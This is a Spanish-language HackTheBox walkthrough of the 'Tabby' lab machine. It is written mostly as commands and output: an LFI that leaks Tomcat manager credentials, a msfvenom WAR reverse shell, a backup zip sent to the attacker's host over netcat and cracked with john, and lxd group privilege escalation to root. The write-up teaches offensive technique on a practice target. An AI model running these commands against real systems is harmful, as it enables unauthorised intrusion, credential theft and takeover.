---
title: HackTheBox - Tabby
categories: [Linux]
tags: [HackTheBox]
image: tabby.png 
img_path: /assets/HTB/Tabby/
---

En este post voy a explicar como resolver la máquina Tabby de [Hack The Box](https://app.hackthebox.com/machines/259), en la cual vamos a estar tocando un LFI para obtener credenciales y así poder subir un archivo malicioso y para la escalada vamos a estar abusando de una vulnerabilidad del grupo ```lxd```.

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.10.194
Nmap scan report for 10.10.10.194
Host is up (0.25s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 453c341435562395d6834e26dec65bd9 (RSA)
|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)
|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Como vemos, la página tiene los puertos 22 (SSH), 80 (HTTP) y 8080(HTTP - Tomcat) abiertos.

## Enumeración
Al ingresar al servidor web que está corriendo en el puerto 80, vemos esto.

<img src="tabby-index-80.png">

Al analizar la página web, vemos que el botón ```News``` nos redirige a ```megahosting.htb``` el cual agregamos a nuestro archivo ```/etc/hosts```.

```
$ echo "10.10.10.194    megahosting.htb" >> /etc/hosts
```

Regresamos nuevamente a la página y vemos que en la URL hay un parámetro llamado ```file```, el cual apunta al archivo ```statement```, posiblemente tenga una vulnerabilidad de ```LFI```.

```
$ curl -s http://megahosting.htb/news.php?file=../../../../etc/passwd | grep "sh$"

root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Si leemos el archivo '''/etc/passwd''' de la máquina víctima, descubrimos el usuario '''ash'''.

Al ingresar al servidor web que está corriendo en el puerto ```8080```, vemos esto.

<img src="tabby-index-8080.png">

Analizando la página, vemos que nos habla de un archivo llamado ```tomcat-users.xml```, si lo intentamos visualizar mediante el ```LFi```, no vamos a ver nada, ya que no se encuentra en esa ruta, pero si buscamos rutas alternativas en las cuales se encuentre ese archivo, encontraremos la siguiente ```/usr/share/tomcat9/etc/tomcat-users.xml```

```
$ curl -s http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml | tail -n 2

<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

Si usamos las credenciales obtenidas para logearnos en la ruta ```/manager/html```, nos aparecerá lo siguiente.

<img src="login-manager-html.png">

Probemos listar las aplicaciones existentes desde terminal haciendo uso de curl y las credenciales anteriormente obtenidas.

```
$ curl -s -u 'tomcat:$3cureP4s5w0rd123!' -X GET 'http://10.10.10.194:8080/manager/text/list'

OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

Como vemos, podemos listar las ```aplicaciones```, intentemos subir un archivo ```.war``` el cual se encargue de mandarnos una ```reverse shell``` a nuestro equipo, para crearlo vamos a hacer uso de msfvenom.

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f war -o reverse.war
Payload size: 1083 bytes
Final size of war file: 1083 bytes
Saved as: reverse.war

$ curl -s -u 'tomcat:$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse' --upload-file reverse.war
OK - Deployed application at context path [/reverse]
```

## Reverse Shell

Para ganar acceso a la máquina, nos mandaremos la Reverse Shell haciendo una petición al archivo recién subido.

```
$ curl -X GET 'http://10.10.10.194:8080/reverse/'
```

```
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.194] 49110
script /dev/null -c bash
Script started, file is /dev/null
tomcat@tabby:/var/lib/tomcat9$ ^Z
[1]  + 4675 suspended  sudo nc -lvnp 443

$ stty raw -echo; fg
[1]  + 4675 continued  sudo nc -lvnp 443
                                        reset xterm

tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ export SHELL=bash
tomcat@tabby:/var/lib/tomcat9$ stty rows 53 columns 235
```

##  Enumeración del sistema
Enumerando directorios, encontré un archivo comprimido y protegido por contraseña en la ruta ```/var/www/html/files```, el cual se llama ```16162020_backup.zip``` y le pertenece al usuario ```ash```, vamos a traerlo a nuestra máquina para intentar extraer la contraseña mediante un ataque de fuerza bruta haciendo uso de ```zip2john``` y ```john```.


```
$ tomcat@tabby:/var/www/html/files$ cat 16162020_backup.zip | nc 10.10.14.9 6969
```

```
$ nc -lvnp 6969 > 16162020_backup.zip
listening on [any] 6969 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.194] 50784
^C

$ ls
16162020_backup.zip  nmap  reverse.war
```

```
$ zip2john 16162020_backup.zip > hash &>/dev/null
$ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:00 DONE (2022-12-10 22:00) 1.315g/s 13635Kp/s 13635Kc/s 13635KC/s adornadis..adhi1411
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Al descomprimir el archivo con la contraseña recién obtenida, veremos que no hay gran cosa, pero podemos probar si hay ```reutilización de contraseñas```.

```
tomcat@tabby:/var/www/html/files$ su ash
Password: admin@it
ash@tabby:/var/www/html/files$
```

Al poner el comando ```id```, veremos que estamos en el grupo ```lxd```.

```
ash@tabby:/var/www/html/files$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
## Escalada de privilegios
Si buscamos con la herramienta searchsploit vulnerabilidades para el grupo ```lxd```, veremos que nos lanzara un script creado por S4vitar y Vowkin.

```
$ searchsploit lxd
------------------------------------------------------------------------------
Exploit Title                                          |  Path
------------------------------------------------------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation              | linux/local/46978.sh
------------------------------------------------------------------------------

$ searchsploit -m linux/local/46978.sh
Exploit: Ubuntu 18.04 - 'lxd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46978
     Path: /usr/share/exploitdb/exploits/linux/local/46978.sh
    Codes: N/A
 Verified: False
File Type: Bourne-Again shell script, Unicode text, UTF-8 text executable

$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
$ chmod +x build-alpine
$ ./build-alpine
$ python3 -m http.server 6969
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
```

```
ash@tabby:/var/www/html/files$ cd /dev/shm
ash@tabby:/dev/shm$ curl -s http://10.10.14.9:6969/46978.sh -o lxd.sh
ash@tabby:/dev/shm$ curl http://10.10.14.9:6969/alpine-v3.17-x86_64-20221210_2249.tar.gz -o alpine.tar.gz
ash@tabby:/dev/shm$ chmod +x lxd.sh

ash@tabby:/dev/shm$ ./lxd.sh -f alpine-v3.17-x86_64-20221210_2249.tar.gz
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine | 761ea182e2d3 | no     | alpine v3.17 (20221210_22:49) | x86_64       | CONTAINER | 3.60MB | Dec 11, 2022 at 2:55am (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # cd /mnt/root/root/
~ # cat root.txt
36b7b242c4b5a18da843964094ee37ad
```
